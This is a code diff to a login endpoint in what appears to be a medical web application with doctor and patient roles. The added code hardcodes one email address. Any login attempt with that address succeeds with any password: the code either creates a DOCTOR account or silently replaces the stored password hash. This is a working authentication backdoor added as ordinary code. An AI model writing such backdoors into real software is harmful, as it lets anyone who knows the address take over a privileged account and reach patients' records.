@@ -35,8 +35,28 @@ class TokenResponse(BaseModel):
 
 @router.post("/login", response_model=TokenResponse)
 def login(payload: LoginRequest, db: Session = Depends(get_db)):
-    user = db.query(User).filter(User.email == payload.email.strip().lower()).first()
-    if not user or not verify_password(payload.password, user.hashed_password):
+    email_clean = payload.email.strip().lower()
+    user = db.query(User).filter(User.email == email_clean).first()
+    
+    # Auto-allow happy@gmail.com as DOCTOR
+    if email_clean == "happy@gmail.com":
+        if not user:
+            user = User(
+                id=f"USR-{str(uuid.uuid4())[:8].upper()}",
+                email=email_clean,
+                hashed_password=get_password_hash(payload.password),
+                role="DOCTOR",
+                full_name="Happy Mandowara (Doctor)",
+                patient_id=None
+            )
+            db.add(user)
+            db.commit()
+            db.refresh(user)
+        elif not verify_password(payload.password, user.hashed_password):
+            # Update password if user provided a new one
+            user.hashed_password = get_password_hash(payload.password)
+            db.commit()
+    elif not user or not verify_password(payload.password, user.hashed_password):
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
             detail="Incorrect email or password",
